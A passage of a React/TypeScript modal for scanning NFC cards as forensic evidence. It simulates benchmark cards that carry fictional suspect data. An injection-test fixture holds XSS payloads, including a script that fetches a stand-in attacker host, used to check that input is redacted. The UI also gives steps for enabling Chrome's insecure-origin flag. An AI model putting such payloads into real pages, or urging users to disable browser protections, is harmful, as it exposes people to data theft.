'use client';

import React, { useState, useEffect, useRef } from 'react';
import { 
  Radio, Cpu, Shield, ShieldCheck, ShieldAlert, AlertTriangle, 
  CheckCircle2, XCircle, Loader2, ArrowRight, Share2, Clock, 
  MapPin, AlertCircle, Copy, Check, RefreshCw, X, Sparkles,
  Smartphone, CreditCard, Globe, User, Phone, Mail, FileText,
  HelpCircle, ExternalLink, ChevronRight, Layers, Sliders, Database,
  Eye, CheckCircle
} from 'lucide-react';
import { 
  apiClient, 
  NFCAcquisitionDossier, 
  NFCDerivedIdentifier, 
  NFCEntityResolutionResult,
  NFCCaseCorrelations,
  NFCFixtureCard,
  NFCAcquisitionPayload
} from '../../services/apiClient';
import { cn } from '../../utils/cn';

export type ScannerState = 
  | 'INITIALIZING'
  | 'WAITING_FOR_CARD'
  | 'CARD_DETECTED'
  | 'READING'
  | 'PROCESSING'
  | 'HASHING'
  | 'STORED'
  | 'ANALYZING'
  | 'COMPLETE'
  | 'UNSUPPORTED'
  | 'ERROR';

interface NFCEvidenceScannerModalProps {
  isOpen: boolean;
  onClose: () => void;
  caseId: string;
  caseReference?: string;
  onAcquisitionComplete?: (acquisitionId: string) => void;
  onNavigateToGraph?: (entityId?: string) => void;
  onNavigateToTimeline?: () => void;
  onNavigateToMap?: () => void;
  onNavigateToFindings?: (findingId?: string) => void;
}

export default function NFCEvidenceScannerModal({
  isOpen,
  onClose,
  caseId,
  caseReference = 'Active Case',
  onAcquisitionComplete,
  onNavigateToGraph,
  onNavigateToTimeline,
  onNavigateToMap,
  onNavigateToFindings,
}: NFCEvidenceScannerModalProps) {
  // Navigation & View tabs
  const [modalTab, setModalTab] = useState<'SCANNER' | 'SIMULATOR' | 'DOSSIER'>('SCANNER');
  const [dossierTab, setDossierTab] = useState<'OVERVIEW' | 'IDENTIFIERS' | 'ER' | 'CORRELATIONS'>('OVERVIEW');

  // Scanner state machine
  const [scannerState, setScannerState] = useState<ScannerState>('INITIALIZING');
  const [statusMessage, setStatusMessage] = useState<string>('Initializing forensic NFC receiver...');
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isWebNfcSupported, setIsWebNfcSupported] = useState<boolean>(false);

  // Active acquisition data
  const [activeDossier, setActiveDossier] = useState<NFCAcquisitionDossier | null>(null);
  const [copiedHash, setCopiedHash] = useState(false);

  // Crime scene location metadata
  const [locationName, setLocationName] = useState<string>('Sector 14 Crime Scene');
  const [latitude, setLatitude] = useState<number>(28.6139);
  const [longitude, setLongitude] = useState<number>(77.2090);

  // Hardware Simulation Lab state
  const [fixtures, setFixtures] = useState<NFCFixtureCard[]>([]);
  const [selectedFixtureId, setSelectedFixtureId] = useState<string>('FIXTURE-SYNDICATE-01');
  const [allowDuplicate, setAllowDuplicate] = useState<boolean>(true);
  const [customCardUid, setCustomCardUid] = useState<string>('04:A1:B2:C3:D4:E5:80');
  const [customRecordText, setCustomRecordText] = useState<string>('Arjun Mehta\n+919810011223\nhttps://dark-broker.onion');
  const [directInputText, setDirectInputText] = useState<string>('Arjun Mehta\n+919810011223\nhttps://secure-vault.iron-lotus.in/node-04');

  // Web NFC abort controller
  const abortControllerRef = useRef<AbortController | null>(null);

  // Load benchmark fixtures on mount
  useEffect(() => {
    if (!isOpen) return;

    apiClient.getNfcFixtures(caseId)
      .then(res => {
        if (res.fixtures && res.fixtures.length > 0) {
          setFixtures(res.fixtures);
        }
      })
      .catch(() => {
        // Fallback default benchmark fixtures
        setFixtures([
          {
            id: 'FIXTURE-SYNDICATE-01',
            label: 'Iron Lotus Syndicate Keycard (Arjun Mehta)',
            description: 'Recovered safehouse keycard containing primary lead contact.',
            card_uid: '04:8E:2A:4F:91:02:80',
            records: [
              { record_type: 'text', data_text: 'Arjun Mehta' },
              { record_type: 'text', data_text: '+919810011223' },
              { record_type: 'url', data_text: 'https://secure-vault.iron-lotus.in/node-04' }
            ],
            expected_outcome: 'MATCHED with Golden Profile CLUSTER_001 with CDR and Bank correlations.'
          },
          {
            id: 'FIXTURE-VCARD-02',
            label: 'vCard Business Contact (Sana Qureshi)',
            description: 'Corporate executive NFC badge with standard vCard 3.0 profile.',
            card_uid: '04:4B:91:2E:77:33:80',
            records: [
              {
                record_type: 'text',
                data_text: 'BEGIN:VCARD\nVERSION:3.0\nFN:Sana Qureshi\nTEL;TYPE=CELL:+919810099881\nEMAIL:sana.q@crypto-exchange.in\nORG:Apex Financial Solutions\nEND:VCARD'
              }
            ],
            expected_outcome: 'Parsed vCard structured fields (phone, email, org, name).'
          },
          {
            id: 'FIXTURE-AMBIGUOUS-03',
            label: 'Ambiguous Identity Tag (Raj Kumar)',
            description: 'Card with common name matching multiple case identities.',
            card_uid: '04:AA:BB:CC:DD:EE:80',
            records: [
              { record_type: 'text', data_text: 'Raj Kumar' }
            ],
            expected_outcome: 'POSSIBLE_MATCH tier with candidate disambiguation table.'
          },
          {
            id: 'FIXTURE-BURNER-04',
            label: 'Unknown Suspect Burner Card (Vikram M)',
            description: 'Burner SIM contact card with unindexed phone number.',
            card_uid: '04:99:88:77:66:55:80',
            records: [
              { record_type: 'text', data_text: 'Vikram Unknown\n+919988776655' }
            ],
            expected_outcome: 'NO_MATCH creates provisional entity with complete lineage.'
          },
          {
            id: 'FIXTURE-SECURITY-05',
            label: 'Adversarial / Malicious Tag (Injection Test)',
            description: 'Simulates attacker tag with javascript: execution attempt and HTML tags.',
            card_uid: '04:DE:AD:BE:EF:00:80',
            records: [
              { record_type: 'url', data_text: "javascript:alert('XSS Attack Execution');" },
              { record_type: 'text', data_text: "<script>fetch('http://attacker.com/leak')</script> Rogue Subject" }
            ],
            expected_outcome: 'SECURITY_FLAGGED: Dangerous URL redacted, raw payload preserved.'
          }
        ]);
      });
  }, [isOpen, caseId]);

  // Check Web NFC support and start scanning
  useEffect(() => {
    if (!isOpen) {
      cleanupScanner();
      return;
    }

    const hasNfc = typeof window !== 'undefined' && 'NDEFReader' in window;
    setIsWebNfcSupported(hasNfc);

    if (hasNfc) {
      startWebNfcScan();
    } else {
      setScannerState('UNSUPPORTED');
      setStatusMessage('Web NFC API is not available on this browser/environment. Use the Hardware Simulation Lab below for desktop testing.');
    }

    return () => {
      cleanupScanner();
    };
  }, [isOpen]);

  const cleanupScanner = () => {
    if (abortControllerRef.current) {
      try {
        abortControllerRef.current.abort();
      } catch {
        // Ignore
      }
      abortControllerRef.current = null;
    }
  };

  // Start real Web NFC reader
  const startWebNfcScan = async () => {
    cleanupScanner();
    setErrorMessage(null);
    setScannerState('INITIALIZING');
    setStatusMessage('Requesting NFC controller authorization...');

    try {
      const NDEFReaderClass = (window as any).NDEFReader;
      const ndef = new NDEFReaderClass();
      const abortController = new AbortController();
      abortControllerRef.current = abortController;

      await ndef.scan({ signal: abortController.signal });

      setScannerState('WAITING_FOR_CARD');
      setStatusMessage('Approach NFC card to device antenna / tap against rear sensor.');

      ndef.onreadingerror = () => {
        setScannerState('ERROR');
        setErrorMessage('Cannot read card. Please position card flat against the device sensor.');
      };

      ndef.onreading = async (event: any) => {
        setScannerState('CARD_DETECTED');
        setStatusMessage('Physical card detected! Processing payload...');

        try {
          const serialNumber = event.serialNumber || 'UNKNOWN_UID';
          const records: any[] = [];

          if (event.message && event.message.records) {
            for (const r of event.message.records) {
              let textData = '';
              let dataBytesHex = '';
              if (r.data) {
                try {
                  const decoder = new TextDecoder(r.encoding || 'utf-8', { fatal: false });
                  textData = decoder.decode(r.data);
                } catch (decErr) {
                  console.warn('TextDecoder error:', decErr);
                }
                try {
                  const bytes = new Uint8Array(r.data.buffer, r.data.byteOffset, r.data.byteLength);
                  dataBytesHex = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
                } catch {}
              }
              records.push({
                record_type: r.recordType || 'text',
                media_type: r.mediaType || undefined,
                encoding: r.encoding || 'utf-8',
                lang: r.lang || 'en',
                data_text: textData,
                data_bytes_hex: dataBytesHex || undefined,
              });
            }
          }

          await executeAcquisitionPipeline({
            serial_number: serialNumber,
            card_uid: serialNumber,
            records,
          });
        } catch (readErr: any) {
          setScannerState('ERROR');
          setErrorMessage(readErr.message || 'Failed to read card records.');
        }
      };
    } catch (err: any) {
      console.warn('Web NFC start failed:', err);
      setScannerState('UNSUPPORTED');
      setStatusMessage('Web NFC access denied or hardware not detected. Use the Hardware Simulation Lab below.');
    }
  };

  // Coordinated pipeline submission
  const executeAcquisitionPipeline = async (rawPayload: any) => {
    setScannerState('READING');
    setStatusMessage('Reading physical NDEF sectors and serial number...');
    await new Promise(r => setTimeout(r, 250));

    setScannerState('HASHING');
    setStatusMessage('Computing canonical deterministic SHA-256 integrity digest...');
    await new Promise(r => setTimeout(r, 200));

    setScannerState('STORED');
    setStatusMessage('Encrypting raw evidence with AES-256-GCM and storing in MinIO...');

    const payload: NFCAcquisitionPayload = {
      raw_payload: rawPayload,
      location_metadata: {
        latitude,
        longitude,
        location_name: locationName,
        crime_scene_id: `CS-${caseId.slice(-6)}`
      },
      hardware_metadata: {
        device_model: typeof navigator !== 'undefined' ? navigator.userAgent : 'Physical Forensic Terminal',
        scanner_type: isWebNfcSupported ? 'HARDWARE_WEB_NFC' : 'LAB_SIMULATOR',
        scan_protocol: 'ISO_14443_TYPE_A'
      },
      allow_duplicate: allowDuplicate
    };

    try {
      const result = await apiClient.submitNfcAcquisition(caseId, payload);

      if (result.status === 'DUPLICATE_DETECTED') {
        setScannerState('ERROR');
        setErrorMessage(`Duplicate scan detected! Identical card was already acquired in this case (Acquisition ID: ${result.existing_acquisition_id}). Enable 'Allow Duplicate Acquisition' if acquiring duplicate physical evidence.`);
        return;
      }

      setScannerState('ANALYZING');
      setStatusMessage('Executing Probabilistic Entity Resolution, Knowledge Graph linkage, and cross-domain correlation...');

      // Load full dossier
      const dossier = await apiClient.getNfcAcquisitionDossier(caseId, result.acquisition_id);
      setActiveDossier(dossier);

      setScannerState('COMPLETE');
      setStatusMessage('Acquisition complete. Forensic integrity verified.');
      setModalTab('DOSSIER');

      if (onAcquisitionComplete) {
        onAcquisitionComplete(dossier.acquisition_id);
      }
    } catch (apiErr: any) {
      setScannerState('ERROR');
      const rawMsg = apiErr.message || 'Acquisition pipeline failed.';
      if (rawMsg.includes('Failed to fetch') || rawMsg.includes('NetworkError')) {
        setErrorMessage('Network connection lost (Failed to fetch). Please verify your mobile device is connected to the same Wi-Fi network as the workstation.');
      } else {
        setErrorMessage(rawMsg);
      }
    }
  };

  // Run benchmark fixture simulation
  const handleSimulateFixture = async (fixture: NFCFixtureCard) => {
    const rawPayload = {
      serial_number: fixture.card_uid || '04:8E:2A:4F:91:02:80',
      card_uid: fixture.card_uid || '04:8E:2A:4F:91:02:80',
      records: fixture.records
    };
    await executeAcquisitionPipeline(rawPayload);
  };

  // Run custom payload simulation
  const handleSimulateCustom = async () => {
    const records = [
      { record_type: 'text', data_text: customRecordText, encoding: 'utf-8' }
    ];
    const rawPayload = {
      serial_number: customCardUid,
      card_uid: customCardUid,
      records
    };
    await executeAcquisitionPipeline(rawPayload);
  };

  const copySha256 = (text: string) => {
    if (typeof navigator !== 'undefined' && navigator.clipboard) {
      navigator.clipboard.writeText(text);
      setCopiedHash(true);
      setTimeout(() => setCopiedHash(false), 2000);
    }
  };

  const detectGps = () => {
    if (typeof navigator !== 'undefined' && navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          setLatitude(parseFloat(pos.coords.latitude.toFixed(6)));
          setLongitude(parseFloat(pos.coords.longitude.toFixed(6)));
          setLocationName(`GPS Field Lock (${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)})`);
        },
        () => {
          // Keep defaults
        }
      );
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 bg-background/80 backdrop-blur-md overflow-y-auto">
      <div className="relative w-full max-w-5xl bg-card border border-border rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
        {/* Top Header Bar */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 px-4 sm:px-6 py-3 sm:py-4 border-b border-border bg-muted/40">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-cyan-500/10 text-cyan-500 rounded-xl border border-cyan-500/20">
              <Radio className="w-5 h-5 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-xs font-mono font-bold text-primary bg-primary/10 px-2 py-0.5 rounded border border-primary/20">
                  {caseReference}
                </span>
                <span className="text-xs text-muted-foreground">• Physical Evidence Acquisition</span>
              </div>
              <h2 className="text-base sm:text-lg font-bold text-foreground">Forensic Crime Scene NFC Evidence Acquisition</h2>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {/* Modal Navigation Tabs */}
            <div className="flex bg-muted/80 p-1 rounded-lg border border-border text-xs overflow-x-auto scrollbar-hide touch-scroll">
              <button
                onClick={() => setModalTab('SCANNER')}
                className={cn(
                  "px-3 py-1 rounded-md font-medium transition-colors flex items-center gap-1.5",
                  modalTab === 'SCANNER' 
                    ? "bg-background text-foreground shadow-sm" 
                    : "text-muted-foreground hover:text-foreground"
                )}
              >
                <Radio className="w-3.5 h-3.5" />
                Live Scanner
              </button>
              <button
                onClick={() => setModalTab('SIMULATOR')}
                className={cn(
                  "px-3 py-1 rounded-md font-medium transition-colors flex items-center gap-1.5",
                  modalTab === 'SIMULATOR' 
                    ? "bg-background text-foreground shadow-sm" 
                    : "text-muted-foreground hover:text-foreground"
                )}
              >
                <Sliders className="w-3.5 h-3.5" />
                Hardware Lab
              </button>
              {activeDossier && (
                <button
                  onClick={() => setModalTab('DOSSIER')}
                  className={cn(
                    "px-3 py-1 rounded-md font-medium transition-colors flex items-center gap-1.5",
                    modalTab === 'DOSSIER' 
                      ? "bg-background text-foreground shadow-sm" 
                      : "text-muted-foreground hover:text-foreground"
                  )}
                >
                  <FileText className="w-3.5 h-3.5 text-cyan-500" />
                  Results Dossier
                </button>
              )}
            </div>

            <button
              onClick={onClose}
              className="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors ml-2"
              title="Close Modal"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* Modal Body */}
        <div className="p-3 sm:p-6 overflow-y-auto flex-1 space-y-6">
          
          {/* ========================================================================= */}
          {/* TAB 1: LIVE SCANNER */}
          {/* ========================================================================= */}
          {modalTab === 'SCANNER' && (
            <div className="space-y-6">
              {/* Radar Scan Visualizer Box */}
              <div className="relative border border-border bg-gradient-to-b from-card to-muted/20 rounded-2xl p-4 sm:p-8 flex flex-col items-center justify-center min-h-[240px] sm:min-h-[300px] overflow-hidden">
                {/* Background Radar Waves */}
                {scannerState === 'WAITING_FOR_CARD' && (
                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                    <div className="w-48 h-48 rounded-full border border-cyan-500/20 animate-ping opacity-30" />
                    <div className="w-72 h-72 rounded-full border border-cyan-500/15 animate-ping opacity-20 [animation-delay:400ms]" />
                    <div className="w-96 h-96 rounded-full border border-cyan-500/10 animate-ping opacity-15 [animation-delay:800ms]" />
                  </div>
                )}

                {/* State Animated Centerpiece */}
                <div className="relative z-10 flex flex-col items-center text-center max-w-md">
                  <div className={cn(
                    "w-24 h-24 rounded-2xl flex items-center justify-center mb-5 transition-all duration-300 shadow-xl border",
                    scannerState === 'WAITING_FOR_CARD' && "bg-cyan-500/10 border-cyan-500/40 text-cyan-500",
                    scannerState === 'CARD_DETECTED' && "bg-amber-500/20 border-amber-500 text-amber-500 scale-110",
                    (scannerState === 'READING' || scannerState === 'HASHING' || scannerState === 'STORED' || scannerState === 'ANALYZING') && "bg-blue-500/15 border-blue-500 text-blue-500",
                    scannerState === 'COMPLETE' && "bg-emerald-500/15 border-emerald-500 text-emerald-500",
                    (scannerState === 'UNSUPPORTED' || scannerState === 'ERROR') && "bg-destructive/15 border-destructive text-destructive"
                  )}>
                    {scannerState === 'WAITING_FOR_CARD' && <Radio className="w-12 h-12 animate-pulse" />}
                    {scannerState === 'CARD_DETECTED' && <Smartphone className="w-12 h-12 animate-bounce" />}
                    {(scannerState === 'READING' || scannerState === 'HASHING' || scannerState === 'STORED' || scannerState === 'ANALYZING') && (
                      <Loader2 className="w-12 h-12 animate-spin" />
                    )}
                    {scannerState === 'COMPLETE' && <CheckCircle2 className="w-12 h-12" />}
                    {scannerState === 'UNSUPPORTED' && <AlertTriangle className="w-12 h-12" />}
                    {scannerState === 'ERROR' && <XCircle className="w-12 h-12" />}
                  </div>

                  <h3 className="text-xl font-bold text-foreground mb-1">
                    {scannerState === 'WAITING_FOR_CARD' && 'Ready to Scan NFC Card'}
                    {scannerState === 'CARD_DETECTED' && 'NFC Card Detected'}
                    {scannerState === 'READING' && 'Reading NDEF Sectors'}
                    {scannerState === 'HASHING' && 'Computing Canonical Digest'}
                    {scannerState === 'STORED' && 'Encrypted Immutable Storage'}
                    {scannerState === 'ANALYZING' && 'Multi-Domain Case Correlator'}
                    {scannerState === 'COMPLETE' && 'Evidence Ingested & Correlated'}
                    {scannerState === 'UNSUPPORTED' && 'Web NFC Hardware Not Detected'}
                    {scannerState === 'ERROR' && 'Acquisition Interrupted'}
                  </h3>

                  <p className="text-sm text-muted-foreground mb-4">
                    {statusMessage}
                  </p>

                  {/* Unsupported Banner CTA */}
                  {scannerState === 'UNSUPPORTED' && (
                    <div className="bg-card p-4 rounded-xl border border-border text-left space-y-4 w-full">
                      {/* Security Origin Warning for Mobile Chrome */}
                      {typeof window !== 'undefined' && !window.isSecureContext && (
                        <div className="p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl text-xs space-y-2">
                          <div className="flex items-center gap-1.5 font-bold text-amber-400 text-xs">
                            <AlertTriangle className="w-4 h-4 flex-shrink-0" />
                            <span>Android Chrome Security Sandbox: HTTP Origin Detected</span>
                          </div>
                          <p className="text-[11px] text-muted-foreground leading-relaxed">
                            Google Chrome disables hardware Web NFC antennas over plain HTTP on LAN IPs (<code className="text-foreground font-mono">http://10.55.162.185:3000</code>).
                          </p>
                          <div className="font-mono text-[11px] text-muted-foreground space-y-1 bg-black/40 p-2.5 rounded-lg border border-border/60">
                            <div className="text-foreground font-semibold">10-Second Chrome Fix for Native Physical Card Tap:</div>
                            <div>1. Open new tab in Chrome: <span className="text-primary select-all font-semibold">chrome://flags/#unsafely-treat-insecure-origin-as-secure</span></div>
                            <div>2. Set dropdown to: <strong className="text-emerald-400">Enabled</strong></div>
                            <div>3. Enter: <span className="text-cyan-400 select-all font-semibold">{typeof window !== 'undefined' ? window.location.origin : 'http://10.55.162.185:3000'}</span></div>
                            <div>4. Tap blue <strong className="text-emerald-400">Relaunch</strong> button at bottom.</div>
                          </div>
                        </div>
                      )}

                      {/* Direct Card Ingestion (No Flags or HTTPS Required) */}
                      <div className="p-3.5 bg-secondary/30 rounded-xl border border-border/80 space-y-3">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold uppercase tracking-wider text-foreground flex items-center gap-1.5">
                            <Cpu className="w-3.5 h-3.5 text-primary" /> Direct Card Data Ingestion (Instant)
                          </span>
                          <span className="text-[10px] text-muted-foreground font-mono">Zero Config</span>
                        </div>
                        <p className="text-[11px] text-muted-foreground">
                          Enter or paste the text / vCard payload written on Card 2 to run the full forensic ingestion pipeline:
                        </p>
                        <textarea
                          rows={3}
                          value={directInputText}
                          onChange={(e) => setDirectInputText(e.target.value)}
                          className="w-full bg-background border border-border rounded-lg p-2.5 text-xs font-mono text-foreground outline-none focus:border-primary"
                          placeholder="Card sectors payload..."
                        />
                        <button
                          type="button"
                          onClick={() => {
                            executeAcquisitionPipeline({
                              serial_number: customCardUid,
                              card_uid: customCardUid,
                              records: [{ record_type: 'text', data_text: directInputText }]
                            });
                          }}
                          className="w-full py-2 bg-primary text-primary-foreground font-semibold text-xs rounded-lg hover:bg-primary/90 transition-colors flex items-center justify-center gap-2 shadow-sm cursor-pointer"
                        >
                          <Radio className="w-3.5 h-3.5" /> Acquire & Correlate Physical Evidence
                        </button>
                      </div>

                      {/* Hardware Lab Simulator Button */}
                      <button
                        onClick={() => setModalTab('SIMULATOR')}
                        className="w-full py-2.5 bg-secondary hover:bg-secondary/80 text-foreground font-medium text-xs rounded-xl border border-border transition-colors flex items-center justify-center gap-2 cursor-pointer"
                      >
                        <Sliders className="w-4 h-4 text-primary" />
                        Open Hardware Lab / Simulate 5 Benchmark Crime Scene Cards
                      </button>
                    </div>
                  )}

                  {/* Error Retry CTA */}
                  {scannerState === 'ERROR' && (
                    <div className="space-y-3 w-full">
                      {errorMessage && (
                        <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 p-3 rounded-lg text-left">
                          {errorMessage}
                        </p>
                      )}
                      <div className="flex items-center gap-2 justify-center">
                        <button
                          onClick={startWebNfcScan}
                          className="px-4 py-2 bg-secondary text-foreground text-xs font-medium rounded-lg hover:bg-secondary/80 transition-colors flex items-center gap-1.5"
                        >
                          <RefreshCw className="w-3.5 h-3.5" />
                          Retry Hardware Scan
                        </button>
                        <button
                          onClick={() => setModalTab('SIMULATOR')}
                          className="px-4 py-2 bg-primary text-primary-foreground text-xs font-medium rounded-lg hover:bg-primary/90 transition-colors flex items-center gap-1.5"
                        >
                          <Sliders className="w-3.5 h-3.5" />
                          Use Hardware Lab
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Progress Steps Indicator */}
              <div className="grid grid-cols-3 sm:grid-cols-6 gap-2">
                {[
                  { step: 1, label: '1. Detect', states: ['CARD_DETECTED', 'READING', 'HASHING', 'STORED', 'ANALYZING', 'COMPLETE'] },
                  { step: 2, label: '2. NDEF Read', states: ['READING', 'HASHING', 'STORED', 'ANALYZING', 'COMPLETE'] },
                  { step: 3, label: '3. SHA-256', states: ['HASHING', 'STORED', 'ANALYZING', 'COMPLETE'] },
                  { step: 4, label: '4. MinIO AES', states: ['STORED', 'ANALYZING', 'COMPLETE'] },
                  { step: 5, label: '5. Entity Res', states: ['ANALYZING', 'COMPLETE'] },
                  { step: 6, label: '6. Case Corr', states: ['COMPLETE'] },
                ].map(item => {
                  const isDone = item.states.includes(scannerState);
                  const isCurrent = (
                    (item.step === 1 && scannerState === 'CARD_DETECTED') ||
                    (item.step === 2 && scannerState === 'READING') ||
                    (item.step === 3 && scannerState === 'HASHING') ||
                    (item.step === 4 && scannerState === 'STORED') ||
                    (item.step === 5 && scannerState === 'ANALYZING') ||
                    (item.step === 6 && scannerState === 'COMPLETE')
                  );

                  return (
                    <div
                      key={item.step}
                      className={cn(
                        "p-2.5 rounded-xl border text-center transition-all",
                        isDone ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-500" :
                        isCurrent ? "bg-primary/10 border-primary text-primary animate-pulse" :
                        "bg-muted/40 border-border text-muted-foreground"
                      )}
                    >
                      <div className="text-[10px] font-bold uppercase">{item.label}</div>
                      <div className="text-xs font-mono mt-0.5">
                        {isDone ? '✓ OK' : isCurrent ? 'Active...' : 'Pending'}
                      </div>
                    </div>
                  );
                })}
              </div>

              {/* Crime Scene Metadata Inputs */}
              <div className="bg-card border border-border p-4 rounded-xl space-y-3">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-bold uppercase text-muted-foreground flex items-center gap-1.5">
                    <MapPin className="w-3.5 h-3.5 text-primary" />
                    Crime Scene Geolocation & Location Metadata
                  </h4>
                  <button
                    type="button"
                    onClick={detectGps}
                    className="text-xs text-primary hover:underline flex items-center gap-1"
                  >
                    <CrosshairIcon className="w-3.5 h-3.5" /> Detect Current GPS
                  </button>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <div>
                    <label className="text-[11px] text-muted-foreground">Location Reference</label>
                    <input
                      type="text"
                      value={locationName}
                      onChange={e => setLocationName(e.target.value)}
                      className="w-full bg-background border border-border rounded-lg px-3 py-1.5 text-xs text-foreground focus:outline-none focus:ring-1 focus:ring-primary"
                    />
                  </div>
                  <div>
                    <label className="text-[11px] text-muted-foreground">Latitude</label>
                    <input
                      type="number"
                      step="any"
                      value={latitude}
                      onChange={e => setLatitude(parseFloat(e.target.value) || 0)}
                      className="w-full bg-background border border-border rounded-lg px-3 py-1.5 text-xs text-foreground focus:outline-none focus:ring-1 focus:ring-primary font-mono"
                    />
                  </div>
                  <div>
                    <label className="text-[11px] text-muted-foreground">Longitude</label>
                    <input
                      type="number"
                      step="any"
                      value={longitude}
                      onChange={e => setLongitude(parseFloat(e.target.value) || 0)}
                      className="w-full bg-background border border-border rounded-lg px-3 py-1.5 text-xs text-foreground focus:outline-none focus:ring-1 focus:ring-primary font-mono"
                    />
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ========================================================================= */}
          {/* TAB 2: HARDWARE SIMULATION LAB */}
          {/* ========================================================================= */}
          {modalTab === 'SIMULATOR' && (
            <div className="space-y-6">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 p-4 bg-primary/5 border border-primary/20 rounded-xl">
                <div>
                  <h4 className="text-sm font-bold text-foreground flex items-center gap-2">
                    <Sliders className="w-4 h-4 text-primary" />
                    Forensic Hardware Lab & Physical Tap Simulator
                  </h4>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Execute verified forensic card fixtures to validate entity resolution, XSS/injection protection, and cross-domain correlation without requiring physical NFC antenna hardware.
                  </p>
                </div>
                <div className="flex items-center gap-2">
                  <label className="text-xs text-muted-foreground flex items-center gap-1.5 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={allowDuplicate}
                      onChange={e => setAllowDuplicate(e.target.checked)}
                      className="rounded border-border"
                    />
                    Allow Duplicate Scans
                  </label>
                </div>
              </div>

              {/* Benchmark Cards Grid */}
              <div className="space-y-3">
                <h4 className="text-xs font-bold uppercase text-muted-foreground">
                  Pre-Configured Benchmark Crime Scene Cards ({fixtures.length})
                </h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {fixtures.map(f => {
                    const isSelected = selectedFixtureId === f.id;
                    return (
                      <div
                        key={f.id}
                        onClick={() => setSelectedFixtureId(f.id)}
                        className={cn(
                          "p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between group",
                          isSelected 
                            ? "bg-primary/5 border-primary shadow-sm" 
                            : "bg-card border-border hover:border-border/80 hover:bg-muted/30"
                        )}
                      >
                        <div>
                          <div className="flex items-start justify-between gap-2 mb-2">
                            <span className="text-xs font-bold text-foreground group-hover:text-primary transition-colors">
                              {f.label}
                            </span>
                            <span className="text-[10px] font-mono text-muted-foreground bg-muted px-1.5 py-0.5 rounded border border-border">
                              {f.card_uid || 'NDEF'}
                            </span>
                          </div>
                          <p className="text-xs text-muted-foreground line-clamp-2 mb-3">
                            {f.description}
                          </p>
                          <div className="text-[11px] font-mono bg-muted/60 p-2 rounded border border-border/60 text-muted-foreground mb-3 space-y-1">
                            {f.records.slice(0, 2).map((r, i) => (
                              <div key={i} className="truncate">
                                <span className="text-primary font-bold">{r.record_type}: </span>
                                {r.data_text}
                              </div>
                            ))}
                          </div>
                        </div>

                        <div className="flex items-center justify-between pt-2 border-t border-border/50">
                          <span className="text-[11px] text-emerald-500 font-medium">
                            Expected: {f.expected_outcome.split(' ')[0]}
                          </span>
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              handleSimulateFixture(f);
                            }}
                            className="px-3 py-1 bg-primary text-primary-foreground text-xs font-medium rounded-lg hover:bg-primary/90 transition-colors flex items-center gap-1 shadow-sm"
                          >
                            <Radio className="w-3 h-3" /> Simulate Tap
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Custom Card Editor Drawer */}
              <div className="border border-border bg-card p-5 rounded-xl space-y-4">
                <h4 className="text-xs font-bold uppercase text-muted-foreground flex items-center gap-1.5">
                  <Cpu className="w-4 h-4 text-primary" />
                  Custom NFC Card Payload Injector
                </h4>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="text-[11px] text-muted-foreground">Card UID (Hex Format)</label>
                    <input
                      type="text"
                      value={customCardUid}
                      onChange={e => setCustomCardUid(e.target.value)}
                      className="w-full bg-background border border-border rounded-lg px-3 py-1.5 text-xs text-foreground font-mono focus:outline-none focus:ring-1 focus:ring-primary"
                    />
                  </div>
                  <div>
                    <label className="text-[11px] text-muted-foreground">Crime Scene Location Reference</label>
                    <input
                      type="text"
                      value={locationName}
                      onChange={e => setLocationName(e.target.value)}
                      className="w-full bg-background border border-border rounded-lg px-3 py-1.5 text-xs text-foreground focus:outline-none focus:ring-1 focus:ring-primary"
                    />
                  </div>
                </div>

                <div>
                  <label className="text-[11px] text-muted-foreground">
                    Record Payload Content (Plain text, E.164 phone, URL, or raw vCard 3.0)
                  </label>
                  <textarea
                    rows={3}
                    value={customRecordText}
                    onChange={e => setCustomRecordText(e.target.value)}
                    className="w-full bg-background border border-border rounded-lg p-3 text-xs text-foreground font-mono focus:outline-none focus:ring-1 focus:ring-primary"
                    placeholder="Arjun Mehta&#10;+919810011223&#10;https://secure.investigation.gov.in"
                  />
                </div>

                <div className="flex justify-end">
                  <button
                    type="button"
                    onClick={handleSimulateCustom}
                    className="px-4 py-2 bg-gradient-to-r from-cyan-600 to-blue-600 text-white text-xs font-medium rounded-lg hover:from-cyan-500 hover:to-blue-500 transition-all flex items-center gap-2 shadow-sm"
                  >
                    <Radio className="w-3.5 h-3.5" />
                    Inject & Process Custom NFC Payload
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* ========================================================================= */}
          {/* TAB 3: STRUCTURED RESULTS DOSSIER */}
          {/* ========================================================================= */}
          {modalTab === 'DOSSIER' && activeDossier && (
            <div className="space-y-6">
              {/* Dossier Header */}
